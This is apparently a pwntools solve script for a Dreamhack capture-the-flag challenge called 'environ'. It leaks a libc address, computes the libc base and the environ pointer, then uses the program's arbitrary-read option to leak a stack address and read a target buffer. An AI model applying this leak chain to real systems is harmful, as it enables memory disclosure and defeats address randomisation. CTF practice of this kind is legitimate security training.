#!/usr/bin/python3

from pwn import *

exe = ELF("./environ_patched")
libc = ELF("./libc.so.6")
context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b *main+186
        c
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 13996)
else:
    p = process([exe.path])
GDB()
p.recvuntil(b'stdout: ')
libc_leak = int(p.recvline(), 16)
libc.address = libc_leak - 0x21a780
environ = libc.address + 0x221200
log.info("libc_leak :" + hex(libc_leak))
log.info("libc_base :" + hex(libc.address))
sla(b'> ', b'1')
sla(b'Addr: ', f'{environ}'.encode())

stack_leak = u64(p.recv(6) + b'\0\0')
buf = stack_leak - 0x1568
log.info("stack leak :" + hex(stack_leak))
log.info("buf :" + hex(buf))
sla(b'> ', b'1')
sla(b'Addr: ', f'{buf}'.encode())

p.interactive()

